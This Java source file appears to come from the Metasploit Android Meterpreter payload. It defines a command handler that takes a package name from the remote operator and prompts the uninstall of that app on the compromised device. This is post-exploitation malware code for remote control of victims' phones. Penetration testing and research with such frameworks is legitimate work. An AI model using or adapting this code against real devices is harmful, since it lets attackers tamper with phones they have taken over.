package com.metasploit.meterpreter.android;

import android.content.Context;

import android.content.Intent;
import android.content.pm.PackageManager;
import android.net.Uri;

import com.metasploit.meterpreter.AndroidMeterpreter;
import com.metasploit.meterpreter.Meterpreter;
import com.metasploit.meterpreter.TLVPacket;
import com.metasploit.meterpreter.command.Command;

public class appapi_app_uninstall implements Command {

    private static final int TLV_EXTENSIONS                = 20000;
    private static final int TLV_TYPE_APP_PACKAGE_NAME     = TLVPacket.TLV_META_TYPE_STRING | (TLV_EXTENSIONS + 2913);
    private static final int TLV_TYPE_APP_ENUM             = TLVPacket.TLV_META_TYPE_UINT   | (TLV_EXTENSIONS + 2915);

    final Context context = AndroidMeterpreter.getContext();

    @Override
    public int execute(Meterpreter meterpreter, TLVPacket request, TLVPacket response) throws Exception {

        String packageName = request.getStringValue(TLV_TYPE_APP_PACKAGE_NAME);

        if (!isPackageInstalled(packageName))
        {
            response.addOverflow(TLV_TYPE_APP_ENUM, 11); // Package not found
            return ERROR_SUCCESS;
        }

        String PackageName = request.getStringValue(TLV_TYPE_APP_PACKAGE_NAME);
        Intent intent = new Intent(Intent.ACTION_DELETE);
        intent.setData(Uri.parse("package:" + PackageName));
        intent.setFlags(Intent.FLAG_ACTIVITY_NEW_TASK);
        context.startActivity(intent);

        response.addOverflow(TLV_TYPE_APP_ENUM, 1); // Good
        return ERROR_SUCCESS;
    }

    private boolean isPackageInstalled(String packageName) {
        try
        {
            context.getPackageManager().getPackageInfo(packageName, 0);
        }
        catch (PackageManager.NameNotFoundException e)
        {
            return false;
        }
        return true;
    }
}
